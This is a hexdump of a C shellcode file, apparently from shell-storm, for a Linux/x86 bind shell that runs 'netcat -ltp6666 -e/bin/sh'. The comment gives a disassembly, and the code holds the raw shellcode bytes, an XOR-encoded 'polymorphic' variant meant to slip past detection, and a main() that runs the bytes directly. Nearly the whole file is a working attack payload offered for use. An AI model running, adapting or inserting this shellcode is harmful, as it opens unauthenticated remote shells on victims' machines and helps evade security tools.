00000000  2f 2a 0a 2a 2a 20 54 69  74 6c 65 3a 20 20 20 20  |/*.** Title:    |
00000010  20 4c 69 6e 75 78 2f 78  38 36 20 2d 20 6e 65 74  | Linux/x86 - net|
00000020  63 61 74 20 62 69 6e 64  73 68 65 6c 6c 20 70 6f  |cat bindshell po|
00000030  72 74 20 36 36 36 36 20  2d 20 36 39 20 62 79 74  |rt 6666 - 69 byt|
00000040  65 73 0a 2a 2a 20 44 61  74 65 3a 20 20 20 20 20  |es.** Date:     |
00000050  20 32 30 31 31 2d 30 34  2d 32 30 0a 2a 2a 20 41  | 2011-04-20.** A|
00000060  75 74 68 6f 72 3a 20 20  20 20 4a 6f 6e 61 74 68  |uthor:    Jonath|
00000070  61 6e 20 53 61 6c 77 61  6e 20 2d 20 74 77 69 74  |an Salwan - twit|
00000080  74 65 72 3a 20 40 6a 6f  6e 61 74 68 61 6e 73 61  |ter: @jonathansa|
00000090  6c 77 61 6e 0a 2a 2a 0a  2a 2a 20 68 74 74 70 3a  |lwan.**.** http:|
000000a0  2f 2f 73 68 65 6c 6c 2d  73 74 6f 72 6d 2e 6f 72  |//shell-storm.or|
000000b0  67 0a 2a 2a 0a 2a 2a 0a  2a 2a 20 2f 75 73 72 2f  |g.**.**.** /usr/|
000000c0  62 69 6e 2f 6e 65 74 63  61 74 20 2d 6c 74 70 36  |bin/netcat -ltp6|
000000d0  36 36 36 20 2d 65 2f 62  69 6e 2f 73 68 0a 2a 2a  |666 -e/bin/sh.**|
000000e0  20 0a 2a 2a 20 38 30 34  38 30 35 34 20 3c 2e 74  | .** 8048054 <.t|
000000f0  65 78 74 3e 3a 0a 2a 2a  20 38 30 34 38 30 35 34  |ext>:.** 8048054|
00000100  3a 09 33 31 20 63 30 20  20 20 20 20 20 20 20 20  |:.31 c0         |
00000110  20 20 20 20 20 20 20 09  78 6f 72 20 20 20 20 25  |       .xor    %|
00000120  65 61 78 2c 25 65 61 78  0a 2a 2a 20 38 30 34 38  |eax,%eax.** 8048|
00000130  30 35 36 3a 09 35 30 20  20 20 20 20 20 20 20 20  |056:.50         |
00000140  20 20 20 20 20 20 20 20  20 20 09 70 75 73 68 20  |          .push |
00000150  20 20 25 65 61 78 0a 2a  2a 20 38 30 34 38 30 35  |  %eax.** 804805|
00000160  37 3a 09 36 38 20 37 34  20 36 33 20 36 31 20 37  |7:.68 74 63 61 7|
00000170  34 20 20 20 20 20 20 20  09 70 75 73 68 20 20 20  |4       .push   |
00000180  24 30 78 37 34 36 31 36  33 37 34 0a 2a 2a 20 38  |$0x74616374.** 8|
00000190  30 34 38 30 35 63 3a 09  36 38 20 36 65 20 32 66  |04805c:.68 6e 2f|
000001a0  20 36 65 20 36 35 20 20  20 20 20 20 20 09 70 75  | 6e 65       .pu|
000001b0  73 68 20 20 20 24 30 78  36 35 36 65 32 66 36 65  |sh   $0x656e2f6e|
000001c0  0a 2a 2a 20 38 30 34 38  30 36 31 3a 09 36 38 20  |.** 8048061:.68 |
000001d0  37 32 20 32 66 20 36 32  20 36 39 20 20 20 20 20  |72 2f 62 69     |
000001e0  20 20 09 70 75 73 68 20  20 20 24 30 78 36 39 36  |  .push   $0x696|
000001f0  32 32 66 37 32 0a 2a 2a  20 38 30 34 38 30 36 36  |22f72.** 8048066|
00000200  3a 09 36 38 20 32 66 20  32 66 20 37 35 20 37 33  |:.68 2f 2f 75 73|
00000210  20 20 20 20 20 20 20 09  70 75 73 68 20 20 20 24  |       .push   $|
00000220  30 78 37 33 37 35 32 66  32 66 0a 2a 2a 20 38 30  |0x73752f2f.** 80|
00000230  34 38 30 36 62 3a 09 38  39 20 65 33 20 20 20 20  |4806b:.89 e3    |
00000240  20 20 20 20 20 20 20 20  20 20 20 20 09 6d 6f 76  |            .mov|
00000250  20 20 20 20 25 65 73 70  2c 25 65 62 78 0a 2a 2a  |    %esp,%ebx.**|
00000260  20 38 30 34 38 30 36 64  3a 09 35 30 20 20 20 20  | 804806d:.50    |
00000270  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 09  |               .|
00000280  70 75 73 68 20 20 20 25  65 61 78 0a 2a 2a 20 38  |push   %eax.** 8|
00000290  30 34 38 30 36 65 3a 09  36 38 20 33 36 20 33 36  |04806e:.68 36 36|
000002a0  20 33 36 20 33 36 20 20  20 20 20 20 20 09 70 75  | 36 36       .pu|
000002b0  73 68 20 20 20 24 30 78  33 36 33 36 33 36 33 36  |sh   $0x36363636|
000002c0  0a 2a 2a 20 38 30 34 38  30 37 33 3a 09 36 38 20  |.** 8048073:.68 |
000002d0  32 64 20 36 63 20 37 34  20 37 30 20 20 20 20 20  |2d 6c 74 70     |
000002e0  20 20 09 70 75 73 68 20  20 20 24 30 78 37 30 37  |  .push   $0x707|
000002f0  34 36 63 32 64 0a 2a 2a  20 38 30 34 38 30 37 38  |46c2d.** 8048078|
00000300  3a 09 38 39 20 65 32 20  20 20 20 20 20 20 20 20  |:.89 e2         |
00000310  20 20 20 20 20 20 20 09  6d 6f 76 20 20 20 20 25  |       .mov    %|
00000320  65 73 70 2c 25 65 64 78  0a 2a 2a 20 38 30 34 38  |esp,%edx.** 8048|
00000330  30 37 61 3a 09 35 30 20  20 20 20 20 20 20 20 20  |07a:.50         |
00000340  20 20 20 20 20 20 20 20  20 20 09 70 75 73 68 20  |          .push |
00000350  20 20 25 65 61 78 0a 2a  2a 20 38 30 34 38 30 37  |  %eax.** 804807|
00000360  62 3a 09 36 38 20 36 65  20 32 66 20 37 33 20 36  |b:.68 6e 2f 73 6|
00000370  38 20 20 20 20 20 20 20  09 70 75 73 68 20 20 20  |8       .push   |
00000380  24 30 78 36 38 37 33 32  66 36 65 0a 2a 2a 20 38  |$0x68732f6e.** 8|
00000390  30 34 38 30 38 30 3a 09  36 38 20 32 66 20 32 66  |048080:.68 2f 2f|
000003a0  20 36 32 20 36 39 20 20  20 20 20 20 20 09 70 75  | 62 69       .pu|
000003b0  73 68 20 20 20 24 30 78  36 39 36 32 32 66 32 66  |sh   $0x69622f2f|
000003c0  0a 2a 2a 20 38 30 34 38  30 38 35 3a 09 36 36 20  |.** 8048085:.66 |
000003d0  36 38 20 32 64 20 36 35  20 20 20 20 20 20 20 20  |68 2d 65        |
000003e0  20 20 09 70 75 73 68 77  20 20 24 30 78 36 35 32  |  .pushw  $0x652|
000003f0  64 0a 2a 2a 20 38 30 34  38 30 38 39 3a 09 38 39  |d.** 8048089:.89|
00000400  20 65 31 20 20 20 20 20  20 20 20 20 20 20 20 20  | e1             |
00000410  20 20 20 09 6d 6f 76 20  20 20 20 25 65 73 70 2c  |   .mov    %esp,|
00000420  25 65 63 78 0a 2a 2a 20  38 30 34 38 30 38 62 3a  |%ecx.** 804808b:|
00000430  09 35 30 20 20 20 20 20  20 20 20 20 20 20 20 20  |.50             |
00000440  20 20 20 20 20 20 09 70  75 73 68 20 20 20 25 65  |      .push   %e|
00000450  61 78 0a 2a 2a 20 38 30  34 38 30 38 63 3a 09 35  |ax.** 804808c:.5|
00000460  31 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |1               |
00000470  20 20 20 20 09 70 75 73  68 20 20 20 25 65 63 78  |    .push   %ecx|
00000480  0a 2a 2a 20 38 30 34 38  30 38 64 3a 09 35 32 20  |.** 804808d:.52 |
00000490  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000004a0  20 20 09 70 75 73 68 20  20 20 25 65 64 78 0a 2a  |  .push   %edx.*|
000004b0  2a 20 38 30 34 38 30 38  65 3a 09 35 33 20 20 20  |* 804808e:.53   |
000004c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000004d0  09 70 75 73 68 20 20 20  25 65 62 78 0a 2a 2a 20  |.push   %ebx.** |
000004e0  38 30 34 38 30 38 66 3a  09 38 39 20 65 36 20 20  |804808f:.89 e6  |
000004f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 09 6d  |              .m|
00000500  6f 76 20 20 20 20 25 65  73 70 2c 25 65 73 69 0a  |ov    %esp,%esi.|
00000510  2a 2a 20 38 30 34 38 30  39 31 3a 09 62 30 20 30  |** 8048091:.b0 0|
00000520  62 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |b               |
00000530  20 09 6d 6f 76 20 20 20  20 24 30 78 62 2c 25 61  | .mov    $0xb,%a|
00000540  6c 0a 2a 2a 20 38 30 34  38 30 39 33 3a 09 38 39  |l.** 8048093:.89|
00000550  20 66 31 20 20 20 20 20  20 20 20 20 20 20 20 20  | f1             |
00000560  20 20 20 09 6d 6f 76 20  20 20 20 25 65 73 69 2c  |   .mov    %esi,|
00000570  25 65 63 78 0a 2a 2a 20  38 30 34 38 30 39 35 3a  |%ecx.** 8048095:|
00000580  09 33 31 20 64 32 20 20  20 20 20 20 20 20 20 20  |.31 d2          |
00000590  20 20 20 20 20 20 09 78  6f 72 20 20 20 20 25 65  |      .xor    %e|
000005a0  64 78 2c 25 65 64 78 0a  2a 2a 20 38 30 34 38 30  |dx,%edx.** 80480|
000005b0  39 37 3a 09 63 64 20 38  30 20 20 20 20 20 20 20  |97:.cd 80       |
000005c0  20 20 20 20 20 20 20 20  20 09 69 6e 74 20 20 20  |         .int   |
000005d0  20 24 30 78 38 30 0a 2a  2a 0a 2a 2f 0a 0a 0a 23  | $0x80.**.*/...#|
000005e0  69 6e 63 6c 75 64 65 20  3c 73 74 64 69 6f 2e 68  |include <stdio.h|
000005f0  3e 0a 23 69 6e 63 6c 75  64 65 20 3c 73 74 72 69  |>.#include <stri|
00000600  6e 67 2e 68 3e 0a 0a 63  68 61 72 20 53 43 5b 5d  |ng.h>..char SC[]|
00000610  20 3d 20 22 5c 78 33 31  5c 78 63 30 5c 78 35 30  | = "\x31\xc0\x50|
00000620  5c 78 36 38 5c 78 37 34  5c 78 36 33 5c 78 36 31  |\x68\x74\x63\x61|
00000630  5c 78 37 34 5c 78 36 38  5c 78 36 65 5c 78 32 66  |\x74\x68\x6e\x2f|
00000640  22 0a 20 20 20 20 20 20  20 20 20 20 20 20 22 5c  |".            "\|
00000650  78 36 65 5c 78 36 35 5c  78 36 38 5c 78 37 32 5c  |x6e\x65\x68\x72\|
00000660  78 32 66 5c 78 36 32 5c  78 36 39 5c 78 36 38 5c  |x2f\x62\x69\x68\|
00000670  78 32 66 5c 78 32 66 5c  78 37 35 22 0a 20 20 20  |x2f\x2f\x75".   |
00000680  20 20 20 20 20 20 20 20  20 22 5c 78 37 33 5c 78  |         "\x73\x|
00000690  38 39 5c 78 65 33 5c 78  35 30 5c 78 36 38 5c 78  |89\xe3\x50\x68\x|
000006a0  33 36 5c 78 33 36 5c 78  33 36 5c 78 33 36 5c 78  |36\x36\x36\x36\x|
000006b0  36 38 5c 78 32 64 22 0a  20 20 20 20 20 20 20 20  |68\x2d".        |
000006c0  20 20 20 20 22 5c 78 36  63 5c 78 37 34 5c 78 37  |    "\x6c\x74\x7|
000006d0  30 5c 78 38 39 5c 78 65  32 5c 78 35 30 5c 78 36  |0\x89\xe2\x50\x6|
000006e0  38 5c 78 36 65 5c 78 32  66 5c 78 37 33 5c 78 36  |8\x6e\x2f\x73\x6|
000006f0  38 22 0a 20 20 20 20 20  20 20 20 20 20 20 20 22  |8".            "|
00000700  5c 78 36 38 5c 78 32 66  5c 78 32 66 5c 78 36 32  |\x68\x2f\x2f\x62|
00000710  5c 78 36 39 5c 78 36 36  5c 78 36 38 5c 78 32 64  |\x69\x66\x68\x2d|
00000720  5c 78 36 35 5c 78 38 39  5c 78 65 31 22 0a 20 20  |\x65\x89\xe1".  |
00000730  20 20 20 20 20 20 20 20  20 20 22 5c 78 35 30 5c  |          "\x50\|
00000740  78 35 31 5c 78 35 32 5c  78 35 33 5c 78 38 39 5c  |x51\x52\x53\x89\|
00000750  78 65 36 5c 78 62 30 5c  78 30 62 5c 78 38 39 5c  |xe6\xb0\x0b\x89\|
00000760  78 66 31 5c 78 33 31 22  0a 20 20 20 20 20 20 20  |xf1\x31".       |
00000770  20 20 20 20 20 22 5c 78  64 32 5c 78 63 64 5c 78  |     "\xd2\xcd\x|
00000780  38 30 22 3b 0a 0a 0a 20  20 20 20 20 20 20 20 20  |80";...         |
00000790  20 20 20 20 20 20 20 2f  2a 20 20 53 43 20 70 6f  |       /*  SC po|
000007a0  6c 79 6d 6f 72 70 68 69  63 20 2d 20 58 4f 52 20  |lymorphic - XOR |
000007b0  31 39 20 2d 20 39 33 20  62 79 74 65 73 20 20 2a  |19 - 93 bytes  *|
000007c0  2f 0a 63 68 61 72 20 53  43 5f 45 4e 43 5b 5d 20  |/.char SC_ENC[] |
000007d0  3d 20 22 5c 78 65 62 5c  78 31 31 5c 78 35 65 5c  |= "\xeb\x11\x5e\|
000007e0  78 33 31 5c 78 63 39 5c  78 62 31 5c 78 34 35 5c  |x31\xc9\xb1\x45\|
000007f0  78 38 30 5c 78 37 34 5c  78 30 65 22 0a 20 20 20  |x80\x74\x0e".   |
00000800  20 20 20 20 20 20 20 20  20 20 20 20 20 22 5c 78  |             "\x|
00000810  66 66 5c 78 31 33 5c 78  38 30 5c 78 65 39 5c 78  |ff\x13\x80\xe9\x|
00000820  30 31 5c 78 37 35 5c 78  66 36 5c 78 65 62 5c 78  |01\x75\xf6\xeb\x|
00000830  30 35 5c 78 65 38 22 0a  20 20 20 20 20 20 20 20  |05\xe8".        |
00000840  20 20 20 20 20 20 20 20  22 5c 78 65 61 5c 78 66  |        "\xea\xf|
00000850  66 5c 78 66 66 5c 78 66  66 5c 78 32 32 5c 78 64  |f\xff\xff\x22\xd|
00000860  33 5c 78 34 33 5c 78 37  62 5c 78 36 37 5c 78 37  |3\x43\x7b\x67\x7|
00000870  30 22 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |0".             |
00000880  20 20 20 22 5c 78 37 32  5c 78 36 37 5c 78 37 62  |   "\x72\x67\x7b|
00000890  5c 78 37 64 5c 78 33 63  5c 78 37 64 5c 78 37 36  |\x7d\x3c\x7d\x76|
000008a0  5c 78 37 62 5c 78 36 31  5c 78 33 63 22 0a 20 20  |\x7b\x61\x3c".  |
000008b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 22 5c  |              "\|
000008c0  78 37 31 5c 78 37 61 5c  78 37 62 5c 78 33 63 5c  |x71\x7a\x7b\x3c\|
000008d0  78 33 63 5c 78 36 36 5c  78 36 30 5c 78 39 61 5c  |x3c\x66\x60\x9a\|
000008e0  78 66 30 5c 78 34 33 22  0a 20 20 20 20 20 20 20  |xf0\x43".       |
000008f0  20 20 20 20 20 20 20 20  20 22 5c 78 37 62 5c 78  |         "\x7b\x|
00000900  32 35 5c 78 32 35 5c 78  32 35 5c 78 32 35 5c 78  |25\x25\x25\x25\x|
00000910  37 62 5c 78 33 65 5c 78  37 66 5c 78 36 37 5c 78  |7b\x3e\x7f\x67\x|
00000920  36 33 22 0a 20 20 20 20  20 20 20 20 20 20 20 20  |63".            |
00000930  20 20 20 20 22 5c 78 39  61 5c 78 66 31 5c 78 34  |    "\x9a\xf1\x4|
00000940  33 5c 78 37 62 5c 78 37  64 5c 78 33 63 5c 78 36  |3\x7b\x7d\x3c\x6|
00000950  30 5c 78 37 62 5c 78 37  62 5c 78 33 63 22 0a 20  |0\x7b\x7b\x3c". |
00000960  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 22  |               "|
00000970  5c 78 33 63 5c 78 37 31  5c 78 37 61 5c 78 37 35  |\x3c\x71\x7a\x75|
00000980  5c 78 37 62 5c 78 33 65  5c 78 37 36 5c 78 39 61  |\x7b\x3e\x76\x9a|
00000990  5c 78 66 32 5c 78 34 33  22 0a 20 20 20 20 20 20  |\xf2\x43".      |
000009a0  20 20 20 20 20 20 20 20  20 20 22 5c 78 34 32 5c  |          "\x42\|
000009b0  78 34 31 5c 78 34 30 5c  78 39 61 5c 78 66 35 5c  |x41\x40\x9a\xf5\|
000009c0  78 61 33 5c 78 31 38 5c  78 39 61 5c 78 65 32 5c  |xa3\x18\x9a\xe2\|
000009d0  78 32 32 22 0a 20 20 20  20 20 20 20 20 20 20 20  |x22".           |
000009e0  20 20 20 20 20 22 5c 78  63 31 5c 78 64 65 5c 78  |     "\xc1\xde\x|
000009f0  39 33 22 3b 0a 0a 69 6e  74 20 6d 61 69 6e 28 76  |93";..int main(v|
00000a00  6f 69 64 29 0a 7b 0a 20  20 20 20 20 20 20 20 66  |oid).{.        f|
00000a10  70 72 69 6e 74 66 28 73  74 64 6f 75 74 2c 22 4c  |printf(stdout,"L|
00000a20  65 6e 67 74 68 3a 20 25  64 5c 6e 22 2c 73 74 72  |ength: %d\n",str|
00000a30  6c 65 6e 28 53 43 29 29  3b 0a 20 20 20 20 20 20  |len(SC));.      |
00000a40  20 20 28 2a 28 76 6f 69  64 28 2a 29 28 29 29 20  |  (*(void(*)()) |
00000a50  53 43 29 28 29 3b 0a 72  65 74 75 72 6e 20 30 3b  |SC)();.return 0;|
00000a60  0a 7d                                             |.}|
00000a62
